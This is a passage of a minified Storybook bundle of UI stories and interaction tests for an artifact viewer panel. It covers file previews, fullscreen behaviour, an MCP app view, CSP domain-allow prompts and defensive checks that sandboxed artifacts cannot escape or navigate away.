weather",arguments:{city:"Berlin"},cancelled:!1,failed:!1}),o.jsx(A,{client:w({mcpApps:{views:ve}}),children:o.jsx("div",{"data-testid":"phone-width",className:"bg-sidebar h-screen",style:{width:358},children:o.jsx(Ne,{workspaceId:h,toolCallId:me,onClose:()=>{}})})})}const N={...g,render:()=>rt(),play:async({canvasElement:e})=>{const t=r(e);await t.findByText(/No view for call-weather-reload/);const a=t.getByRole("button",{name:"Reload"}),s=t.getByTestId("phone-width").getBoundingClientRect();await n(a.getBoundingClientRect().right).toBeLessThanOrEqual(s.right),ve[me]={html:"<p>Berlin</p>",csp:{},prefersBorder:null,resultAvailable:!0,result:{content:[{type:"text",text:"Berlin: 18°C"}]},approvalProjectPath:"/repo",invocation:null},await p.click(a),await t.findByTestId("mcp-app-frame")}},we={connectDomains:["https://api.example.com"],resourceDomains:["https://cdn.example.com"]},ke=e=>i(()=>{const t=r(e).getAllByRole("alert").find(a=>a.textContent?.includes("api.example.com"));if(t==null)throw new Error("no domains strip");return t}),Ke=async e=>{const t=await ke(e);await n(t.textContent).toContain("cdn.example.com");const a=r(e).getByTestId("mcp-app-frame");await n(a.getAttribute("srcdoc")).not.toContain("https://api.example.com"),await n(r(t).getByRole("button",{name:"Not now"})).toBeVisible()},ie={globals:{viewport:{value:"laptop1200",isRotated:!1}},parameters:{pixel:m},render:()=>f(D,we),play:({canvasElement:e})=>Ke(e)},le={globals:{viewport:{value:"phone390",isRotated:!1}},parameters:{pixel:m},render:()=>f(D,we),play:({canvasElement:e})=>Ke(e)},ce={parameters:{pixel:m},render:()=>f(D,we),play:async({canvasElement:e})=>{const t=await ke(e),a=r(t).getByRole("button",{name:"Allow"});await i(()=>n(a).toBeEnabled(),{timeout:5e3}),await p.click(a),await i(async()=>{const s=r(e).getByTestId("mcp-app-frame").getAttribute("srcdoc")??"";await n(s).toContain("connect-src https://api.example.com"),await n(s).toContain("https://cdn.example.com")}),await n(t.isConnected).toBe(!1)}},pe={globals:{viewport:{value:"phone390",isRotated:!1}},parameters:{pixel:m},render:()=>o.jsx("div",{style:{width:375,maxWidth:"100%",height:"100%"},children:f(D,we,"Could not write the project config")}),play:async({canvasElement:e})=>{const t=await ke(e),a=r(t).getByRole("button",{name:"Allow"});await i(()=>n(a).toBeEnabled(),{timeout:5e3}),await p.click(a),await r(e).findByText(/Could not allow the domains: Could not write/),await i(()=>n(a).toBeEnabled()),await n(r(t).getByRole("button",{name:"Not now"})).toBeEnabled();const s=r(e).getByTestId("mcp-app-frame").getAttribute("srcdoc")??"";await n(s).not.toContain("https://api.example.com"),await n(t.getBoundingClientRect().right).toBeLessThanOrEqual(375),await n(t.scrollWidth).toBeLessThanOrEqual(t.clientWidth),await n(a.getBoundingClientRect().right).toBeLessThanOrEqual(375)}},de={parameters:{pixel:m},render:()=>f(Se("location")),play:async({canvasElement:e})=>{const t=r(e);await t.findByText(/This artifact navigated away/,void 0,{timeout:1e4}),await n(t.queryByTestId("mcp-app-frame")).toBeNull()}};M.parameters={...M.parameters,docs:{...M.parameters?.docs,source:{originalSource:`{
  ...PHONE,
  render: () => renderPanel("report.md"),
  play: ({
    canvasElement
  }) => waitForMarkdown(canvasElement)
}`,...M.parameters?.docs?.source}}};T.parameters={...T.parameters,docs:{...T.parameters?.docs,source:{originalSource:`{
  ...LAPTOP,
  render: () => renderPanel("report.md"),
  play: ({
    canvasElement
  }) => waitForMarkdown(canvasElement)
}`,...T.parameters?.docs?.source}}};L.parameters={...L.parameters,docs:{...L.parameters?.docs,source:{originalSource:`{
  ...PHONE,
  render: () => renderPanel("services.json"),
  play: ({
    canvasElement
  }) => waitForJsonTable(canvasElement)
}`,...L.parameters?.docs?.source}}};j.parameters={...j.parameters,docs:{...j.parameters?.docs,source:{originalSource:`{
  ...LAPTOP,
  render: () => renderPanel("services.json"),
  play: ({
    canvasElement
  }) => waitForJsonTable(canvasElement)
}`,...j.parameters?.docs?.source}}};G.parameters={...G.parameters,docs:{...G.parameters?.docs,source:{originalSource:`{
  ...PHONE,
  render: () => renderPanel("revenue.csv"),
  play: ({
    canvasElement
  }) => waitForCsv(canvasElement)
}`,...G.parameters?.docs?.source}}};W.parameters={...W.parameters,docs:{...W.parameters?.docs,source:{originalSource:`{
  ...LAPTOP,
  render: () => renderPanel("revenue.csv"),
  play: ({
    canvasElement
  }) => waitForCsv(canvasElement)
}`,...W.parameters?.docs?.source}}};F.parameters={...F.parameters,docs:{...F.parameters?.docs,source:{originalSource:`{
  ...PHONE,
  render: () => renderPanel("dashboard.html"),
  play: ({
    canvasElement
  }) => waitForHtml(canvasElement)
}`,...F.parameters?.docs?.source}}};k.parameters={...k.parameters,docs:{...k.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: PIXEL_DISABLED,
    browserMode: true
  },
  render: () => renderPanel("dashboard.html"),
  play: async ({
    canvasElement
  }) => {
    await waitForHtml(canvasElement);
    await within(canvasElement).findByRole("button", {
      name: "Annotate"
    });
  }
}`,...k.parameters?.docs?.source},description:{story:"Outside the desktop app (phones) the artifact previews with its bridge and frame Annotate.",...k.parameters?.docs?.description}}};_.parameters={..._.parameters,docs:{..._.parameters?.docs,source:{originalSource:`{
  ...LAPTOP,
  render: () => renderPanel("dashboard.html"),
  play: ({
    canvasElement
  }) => waitForHtml(canvasElement)
}`,..._.parameters?.docs?.source}}};O.parameters={...O.parameters,docs:{...O.parameters?.docs,source:{originalSource:`{
  ...PHONE,
  render: () => renderPanel("img/chart.png"),
  play: ({
    canvasElement
  }) => zoomImage(canvasElement)
}`,...O.parameters?.docs?.source}}};q.parameters={...q.parameters,docs:{...q.parameters?.docs,source:{originalSource:`{
  ...LAPTOP,
  render: () => renderPanel("img/chart.png"),
  play: ({
    canvasElement
  }) => zoomImage(canvasElement)
}`,...q.parameters?.docs?.source}}};V.parameters={...V.parameters,docs:{...V.parameters?.docs,source:{originalSource:`{
  ...PHONE,
  render: () => renderPanel("queue.diff"),
  play: ({
    canvasElement
  }) => waitForDiff(canvasElement)
}`,...V.parameters?.docs?.source}}};J.parameters={...J.parameters,docs:{...J.parameters?.docs,source:{originalSource:`{
  ...LAPTOP,
  render: () => renderPanel("queue.diff"),
  play: ({
    canvasElement
  }) => waitForDiff(canvasElement)
}`,...J.parameters?.docs?.source}}};K.parameters={...K.parameters,docs:{...K.parameters?.docs,source:{originalSource:`{
  globals: {
    viewport: {
      value: "phone390",
      isRotated: false
    }
  },
  parameters: {
    pixel: {
      matrix: {
        themes: ["dark", "light"],
        viewports: ["phone"]
      }
    }
  },
  render: renderGallery,
  play: ({
    canvasElement
  }) => waitForGallery(canvasElement)
}`,...K.parameters?.docs?.source}}};H.parameters={...H.parameters,docs:{...H.parameters?.docs,source:{originalSource:`{
  globals: {
    viewport: {
      value: "laptop1200",
      isRotated: false
    }
  },
  parameters: {
    pixel: {
      matrix: {
        themes: ["dark", "light"],
        viewports: ["laptop"]
      }
    }
  },
  render: renderGallery,
  play: ({
    canvasElement
  }) => waitForGallery(canvasElement)
}`,...H.parameters?.docs?.source}}};C.parameters={...C.parameters,docs:{...C.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: {
      matrix: {
        themes: ["dark", "light"],
        viewports: ["phone", "laptop"]
      }
    }
  },
  render: () => <APIProvider client={createMockORPCClient({
    artifacts: {
      listing: listingFor(CANVAS_FILES),
      files: CANVAS_FILES
    }
  })}>
      <div className="bg-background flex justify-end">
        <div className="bg-sidebar border-border-light w-full max-w-[440px] min-w-0 border-l">
          <ArtifactViewer result={CANVAS_FILES["q3.canvas.json"]} workspaceId={WORKSPACE_ID} interactions={{
          requestSend: () => undefined
        }} />
        </div>
      </div>
    </APIProvider>,
  play: async ({
    canvasElement
  }) => {
    const canvas = within(canvasElement);
    await canvas.findByRole("heading", {
      name: "Q3 service review"
    });
    await canvas.findByText("Unsupported block: widget");
    await canvas.findByRole("button", {
      name: "Draft the Q4 plan"
    });
    const image = await canvas.findByRole("img", {
      name: "Throughput chart"
    });
    await waitFor(() => expect(image.getAttribute("src")).toMatch(/^data:image\\/png;base64,/));
    // Both charts drew (the second from the referenced file, via its JSON pointer).
    await waitFor(() => expect(canvasElement.querySelectorAll(".recharts-wrapper").length).toBe(2));
  }
}`,...C.parameters?.docs?.source},description:{story:`Every canvas block type, rendered by the viewer directly so the button has interactions
(the panel wires those itself). One story, phone + laptop: the column is the sidebar width.`,...C.parameters?.docs?.description}}};I.parameters={...I.parameters,docs:{...I.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: {
      matrix: {
        themes: ["dark", "light"],
        viewports: ["phone", "laptop"]
      }
    }
  },
  render: () => renderPanel("rollout.canvas.json", {
    "rollout.canvas.json": ok("rollout.canvas.json", INTERACTIVE_CANVAS)
  }, {
    sendInteractionError: "Workspace not found: story"
  }),
  play: async ({
    canvasElement
  }) => {
    const canvas = within(canvasElement);
    await userEvent.click(await canvas.findByRole("button", {
      name: "Approve plan B"
    }));
    const strip = await canvas.findByTestId("artifact-send-strip");
    await within(strip).findByText("Approve plan B.");
    await within(strip).findByText("Workspace not found: story");
    // Send arms shortly after the strip appears; wait so the snapshot is stable.
    const send = within(strip).getByRole("button", {
      name: "Send"
    });
    await waitFor(() => expect(send).toBeEnabled(), {
      timeout: 5000
    });
    await userEvent.click(canvas.getByRole("button", {
      name: "Annotate"
    }));
    await canvas.findByText("Annotating: select text to comment on it.");
    const paragraph = await canvas.findByText(/Plan B ships the cache/);
    const text = paragraph.firstChild!;
    const range = canvasElement.ownerDocument.createRange();
    range.setStart(text, 0);
    range.setEnd(text, "Plan B ships the cache".length);
    const selection = canvasElement.ownerDocument.getSelection()!;
    selection.removeAllRanges();
    selection.addRange(range);
    paragraph.dispatchEvent(new MouseEvent("mouseup", {
      bubbles: true
    }));
    const popover = await canvas.findByTestId("artifact-annotation-popover");
    await within(popover).findByText("“Plan B ships the cache”");
  }
}`,...I.parameters?.docs?.source},description:{story:`Host-owned controls around an artifact (M5b): the confirm strip with its error after a clicked
canvas send failed (a clicked send that works shows no strip), and annotate mode with a text
selection's comment box open.`,...I.parameters?.docs?.description}}};Y.parameters={...Y.parameters,docs:{...Y.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: {
      matrix: {
        themes: ["dark", "light"],
        viewports: ["laptop"]
      }
    }
  },
  render: renderVersionMenu,
  play: async ({
    canvasElement
  }) => {
    await waitForMarkdown(canvasElement);
    const canvas = within(canvasElement);
    await userEvent.click(await canvas.findByRole("button", {
      name: "Version: Latest (live)"
    }));
    const menu = await canvas.findByRole("menu", {
      name: "Artifact versions"
    });
    await within(menu).findByText("Turn snapshot");
  }
}`,...Y.parameters?.docs?.source}}};z.parameters={...z.parameters,docs:{...z.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: {
      matrix: {
        themes: ["dark", "light"],
        viewports: ["phone"]
      }
    }
  },
  globals: {
    viewport: {
      value: "phone390",
      isRotated: false
    }
  },
  render: renderShelfPicker,
  play: ({
    canvasElement
  }) => openShelfPicker(canvasElement)
}`,...z.parameters?.docs?.source}}};U.parameters={...U.parameters,docs:{...U.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: {
      matrix: {
        themes: ["dark", "light"],
        viewports: ["laptop"]
      }
    }
  },
  render: renderShelfPicker,
  play: ({
    canvasElement
  }) => openShelfPicker(canvasElement)
}`,...U.parameters?.docs?.source}}};$.parameters={...$.parameters,docs:{...$.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: {
      matrix: {
        themes: ["dark", "light"],
        viewports: ["phone"]
      }
    }
  },
  globals: {
    viewport: {
      value: "phone390",
      isRotated: false
    }
  },
  render: renderOtherFilesPicker,
  play: ({
    canvasElement
  }) => toggleOtherFiles(canvasElement)
}`,...$.parameters?.docs?.source}}};X.parameters={...X.parameters,docs:{...X.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: {
      matrix: {
        themes: ["dark", "light"],
        viewports: ["laptop"]
      }
    }
  },
  render: renderOtherFilesPicker,
  play: ({
    canvasElement
  }) => toggleOtherFiles(canvasElement)
}`,...X.parameters?.docs?.source}}};Z.parameters={...Z.parameters,docs:{...Z.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: PIXEL_DISABLED
  },
  beforeEach: collectEscapeResults,
  render: () => renderPanel("escape.html", {
    "escape.html": ok("escape.html", ESCAPE_HTML)
  }),
  play: () => assertEscapeAttemptsFail(true)
}`,...Z.parameters?.docs?.source}}};ee.parameters={...ee.parameters,docs:{...ee.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: PIXEL_DISABLED
  },
  beforeEach: collectEscapeResults,
  render: () => renderPanel("escape.html", {
    "escape.html": ok("escape.html", ESCAPE_HTML)
  }, {
    allowCdn: false
  }),
  play: () => assertEscapeAttemptsFail(false)
}`,...ee.parameters?.docs?.source}}};te.parameters={...te.parameters,docs:{...te.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: PIXEL_DISABLED
  },
  render: () => renderPanel("away.html", {
    "away.html": ok("away.html", navigateAwayHtml("location"))
  }),
  play: ({
    canvasElement
  }) => assertNavigatedAway(canvasElement)
}`,...te.parameters?.docs?.source}}};ae.parameters={...ae.parameters,docs:{...ae.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: PIXEL_DISABLED
  },
  render: () => renderPanel("away.html", {
    "away.html": ok("away.html", navigateAwayHtml("link"))
  }),
  play: ({
    canvasElement
  }) => assertNavigatedAway(canvasElement)
}`,...ae.parameters?.docs?.source}}};ne.parameters={...ne.parameters,docs:{...ne.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: PIXEL_DISABLED
  },
  beforeEach: () => {
    bridgeMessages.length = 0;
    const handler = (event: MessageEvent) => {
      const message = (event.data as {
        xumBridgeTest?: unknown;
      } | null)?.xumBridgeTest;
      if (typeof message === "string") bridgeMessages.push(message);
    };
    window.addEventListener("message", handler);
    return () => window.removeEventListener("message", handler);
  },
  // Own workspace: annotate mode is kept per workspace, and an earlier story leaves it on in
  // the shared one, where the frame's Escape would only leave annotate mode.
  render: () => renderPanel("bridge.html", {
    "bridge.html": ok("bridge.html", BRIDGE_HTML)
  }, {
    workspaceId: \`\${WORKSPACE_ID}-bridge\`
  }),
  play: async ({
    canvasElement
  }) => {
    const canvas = within(canvasElement);
    const frame = await canvas.findByTestId("artifact-frame");
    if (!(frame instanceof HTMLIFrameElement)) throw new Error("Story bug: no artifact iframe");
    await waitFor(() => expect(bridgeMessages).toContain("ready"));
    await userEvent.click(canvas.getByRole("button", {
      name: "Fullscreen"
    }));
    await waitFor(() =>
    // A modal dialog in a narrow window, a region in a wide one: only fullscreen labels it.
    expect(canvasElement.ownerDocument.querySelector('[data-testid="artifacts-panel"][aria-label]')).not.toBeNull());
    // Fullscreen keeps the same frame: entering it must not reload the artifact.
    await expect(canvas.getByTestId("artifact-frame")).toBe(frame);
    await expect(bridgeMessages.filter(message => message === "ready")).toHaveLength(1);
    frame.contentWindow?.postMessage({
      xumBridgeTest: "press-escape"
    }, "*");
    await waitFor(() => expect(bridgeMessages).toContain("sent-escape"), {
      timeout: 10000
    });
    // The host must leave fullscreen.
    await waitFor(() => expect(canvasElement.ownerDocument.querySelector('[data-testid="artifacts-panel"][aria-label]')).toBeNull());
  }
}`,...ne.parameters?.docs?.source}}};re.parameters={...re.parameters,docs:{...re.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: PIXEL_DISABLED
  },
  render: () => renderPanel("tree.json", {
    "tree.json": ok("tree.json", '{"runs":[1,2]}'),
    "notes.txt": ok("notes.txt", "notes")
  }, {
    workspaceId: SWAP_WORKSPACE_ID
  }),
  play: async ({
    canvasElement
  }) => {
    const canvas = within(canvasElement);
    await canvas.findByRole("button", {
      name: /^runs:/
    });
    await userEvent.click(canvas.getByRole("button", {
      name: "Fullscreen"
    }));
    // A modal dialog in a narrow window, a region in a wide one: both carry the label.
    const dialog = await canvas.findByLabelText("Artifact tree.json");
    const toggle = within(dialog).getByRole("button", {
      name: /^runs:/
    });
    toggle.focus();
    await expect(toggle).toHaveFocus();
    writeArtifactSelection(SWAP_WORKSPACE_ID, {
      scope: "artifact",
      path: "notes.txt"
    });
    await waitFor(() => expect(toggle.isConnected).toBe(false));
    await waitFor(() => expect(dialog).toHaveFocus());
    await userEvent.keyboard("{Escape}");
    await waitFor(() => expect(canvas.queryByLabelText("Artifact tree.json")).toBeNull());
  }
}`,...re.parameters?.docs?.source}}};se.parameters={...se.parameters,docs:{...se.parameters?.docs,source:{originalSource:`{
  ...LAPTOP,
  render: () => renderMcpAppView(),
  play: ({
    canvasElement
  }) => playMcpAppView(canvasElement)
}`,...se.parameters?.docs?.source}}};oe.parameters={...oe.parameters,docs:{...oe.parameters?.docs,source:{originalSource:`{
  ...PHONE,
  render: () => renderMcpAppView(),
  play: ({
    canvasElement
  }) => playMcpAppView(canvasElement)
}`,...oe.parameters?.docs?.source}}};R.parameters={...R.parameters,docs:{...R.parameters?.docs,source:{originalSource:`{
  ...LAPTOP,
  render: () => renderMcpAppView(),
  play: async ({
    canvasElement
  }) => {
    const canvas = within(canvasElement);
    const frame = await canvas.findByTestId("mcp-app-frame");
    const panel = canvas.getByTestId("app-view-tab-panel");
    const sidebarWidth = panel.getBoundingClientRect().width;
    await userEvent.click(canvas.getByRole("button", {
      name: "Maximize view"
    }));
    await waitFor(() => expect(panel.getBoundingClientRect().width).toBe(window.innerWidth));
    await expect(canvas.getByTestId("mcp-app-frame")).toBe(frame);
    await userEvent.click(canvas.getByRole("button", {
      name: "Restore view"
    }));
    await waitFor(() => expect(panel.getBoundingClientRect().width).toBe(sidebarWidth));
    await expect(canvas.getByTestId("mcp-app-frame")).toBe(frame);
  }
}`,...R.parameters?.docs?.source},description:{story:`#6165: Maximize pins the app tab over the whole window (the spec's fullscreen), with the same
frame (no reload), and Restore returns it to the sidebar. Play only (shared Pixel cap).`,...R.parameters?.docs?.description}}};N.parameters={...N.parameters,docs:{...N.parameters?.docs,source:{originalSource:`{
  ...PHONE,
  render: () => renderMcpAppViewReload(),
  play: async ({
    canvasElement
  }) => {
    const canvas = within(canvasElement);
    await canvas.findByText(/No view for call-weather-reload/);
    const reload = canvas.getByRole("button", {
      name: "Reload"
    });
    // The button stays inside the narrow tab.
    const tab = canvas.getByTestId("phone-width").getBoundingClientRect();
    await expect(reload.getBoundingClientRect().right).toBeLessThanOrEqual(tab.right);
    reloadViews[RELOAD_TOOL_CALL_ID] = {
      html: "<p>Berlin</p>",
      csp: {},
      prefersBorder: null,
      resultAvailable: true,
      result: {
        content: [{
          type: "text",
          text: "Berlin: 18°C"
        }]
      },
      approvalProjectPath: "/repo",
      invocation: null
    };
    await userEvent.click(reload);
    await canvas.findByTestId("mcp-app-frame");
  }
}`,...N.parameters?.docs?.source},description:{story:"Failed load, then Reload: Play only (the stack adds no Pixel snapshots, shared cap).",...N.parameters?.docs?.description}}};ie.parameters={...ie.parameters,docs:{...ie.parameters?.docs,source:{originalSource:`{
  globals: {
    viewport: {
      value: "laptop1200",
      isRotated: false
    }
  },
  // Dark only: both widths are captured, and the strip uses shared theme tokens (Pixel budget).
  // Play only: the stack adds no Pixel snapshots (shared cap).
  parameters: {
    pixel: PIXEL_DISABLED
  },
  render: () => renderMcpAppView(MCP_APP_VIEW_HTML, DOMAINS_CSP),
  play: ({
    canvasElement
  }) => playDomainsStrip(canvasElement)
}`,...ie.parameters?.docs?.source}}};le.parameters={...le.parameters,docs:{...le.parameters?.docs,source:{originalSource:`{
  globals: {
    viewport: {
      value: "phone390",
      isRotated: false
    }
  },
  // Dark only: both widths are captured, and the strip uses shared theme tokens (Pixel budget).
  // Play only: the stack adds no Pixel snapshots (shared cap).
  parameters: {
    pixel: PIXEL_DISABLED
  },
  render: () => renderMcpAppView(MCP_APP_VIEW_HTML, DOMAINS_CSP),
  play: ({
    canvasElement
  }) => playDomainsStrip(canvasElement)
}`,...le.parameters?.docs?.source}}};ce.parameters={...ce.parameters,docs:{...ce.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: PIXEL_DISABLED
  },
  render: () => renderMcpAppView(MCP_APP_VIEW_HTML, DOMAINS_CSP),
  play: async ({
    canvasElement
  }) => {
    const strip = await findDomainsStrip(canvasElement);
    const allow = within(strip).getByRole("button", {
      name: "Allow"
    });
    await waitFor(() => expect(allow).toBeEnabled(), {
      timeout: 5000
    });
    await userEvent.click(allow);
    await waitFor(async () => {
      const csp = within(canvasElement).getByTestId("mcp-app-frame").getAttribute("srcdoc") ?? "";
      await expect(csp).toContain("connect-src https://api.example.com");
      await expect(csp).toContain("https://cdn.example.com");
    });
    await expect(strip.isConnected).toBe(false);
  }
}`,...ce.parameters?.docs?.source}}};pe.parameters={...pe.parameters,docs:{...pe.parameters?.docs,source:{originalSource:`{
  globals: {
    viewport: {
      value: "phone390",
      isRotated: false
    }
  },
  parameters: {
    pixel: PIXEL_DISABLED
  },
  // The test-runner ignores viewport globals, so the wrapper keeps the play at phone width.
  render: () => <div style={{
    width: 375,
    maxWidth: "100%",
    height: "100%"
  }}>
      {renderMcpAppView(MCP_APP_VIEW_HTML, DOMAINS_CSP, "Could not write the project config")}
    </div>,
  play: async ({
    canvasElement
  }) => {
    const strip = await findDomainsStrip(canvasElement);
    const allow = within(strip).getByRole("button", {
      name: "Allow"
    });
    await waitFor(() => expect(allow).toBeEnabled(), {
      timeout: 5000
    });
    await userEvent.click(allow);
    await within(canvasElement).findByText(/Could not allow the domains: Could not write/);
    await waitFor(() => expect(allow).toBeEnabled());
    await expect(within(strip).getByRole("button", {
      name: "Not now"
    })).toBeEnabled();
    const csp = within(canvasElement).getByTestId("mcp-app-frame").getAttribute("srcdoc") ?? "";
    await expect(csp).not.toContain("https://api.example.com");
    // The strip and its buttons fit the phone width.
    await expect(strip.getBoundingClientRect().right).toBeLessThanOrEqual(375);
    await expect(strip.scrollWidth).toBeLessThanOrEqual(strip.clientWidth);
    await expect(allow.getBoundingClientRect().right).toBeLessThanOrEqual(375);
  }
}`,...pe.parameters?.docs?.source}}};de.parameters={...de.parameters,docs:{...de.parameters?.docs,source:{originalSource:`{
  parameters: {
    pixel: PIXEL_DISABLED
  },
  render: () => renderMcpAppView(navigateAwayHtml("location")),
  play: async ({
    canvasElement
  }) => {
    const canvas = within(canvasElement);
    await canvas.findByText(/This artifact navigated away/, undefined, {
      timeout: 10000
    });
    await expect(canvas.queryByTestId("mcp-app-frame")).toBeNull();
  }
}`,...de.parameters?.docs?.source}}};const Nt=["MarkdownPhone","MarkdownLaptop","JsonTablePhone","JsonTableLaptop","CsvPhone","CsvLaptop","HtmlSandboxPhone","HtmlBrowserMode","HtmlSandboxLaptop","ImageZoomPhone","ImageZoomLaptop","DiffPhone","DiffLaptop","GalleryPhone","GalleryLaptop","CanvasGallery","SendStripAndAnnotate","VersionMenuOpen","ShelfPickerPhone","ShelfPickerLaptop","OtherFilesPickerPhone","OtherFilesPickerLaptop","EscapeAttemptsCdnOn","EscapeAttemptsCdnOff","NavigateAwayLocation","NavigateAwayLink","BridgeEscapeExitsFullscreen","FullscreenKeepsFocusWhenViewerSwaps","McpAppViewLaptop","McpAppViewPhone","McpAppViewMaximized","McpAppViewReloadPhone","McpAppViewDomainsLaptop","McpAppViewDomainsPhone","McpAppViewDomainsAllow","McpAppViewDomainsAllowFailsPhone","McpAppViewNavigateAway"];export{ne as BridgeEscapeExitsFullscreen,C as CanvasGallery,W as CsvLaptop,G as CsvPhone,J as DiffLaptop,V as DiffPhone,ee as EscapeAttemptsCdnOff,Z as EscapeAttemptsCdnOn,re as FullscreenKeepsFocusWhenViewerSwaps,H as GalleryLaptop,K as GalleryPhone,k as HtmlBrowserMode,_ as HtmlSandboxLaptop,F as HtmlSandboxPhone,q as ImageZoomLaptop,O as ImageZoomPhone,j as JsonTableLaptop,L as JsonTablePhone,T as MarkdownLaptop,M as MarkdownPhone,ce as McpAppViewDomainsAllow,pe as McpAppViewDomainsAllowFailsPhone,ie as McpAppViewDomainsLaptop,le as McpAppViewDomainsPhone,se as McpAppViewLaptop,R as McpAppViewMaximized,de as McpAppViewNavigateAway,oe as McpAppViewPhone,N as McpAppViewReloadPhone,ae as NavigateAwayLink,te as NavigateAwayLocation,X as OtherFilesPickerLaptop,$ as OtherFilesPickerPhone,I as SendStripAndAnnotate,U as ShelfPickerLaptop,z as ShelfPickerPhone,Y as VersionMenuOpen,Nt as __namedExportsOrder,Rt as default};
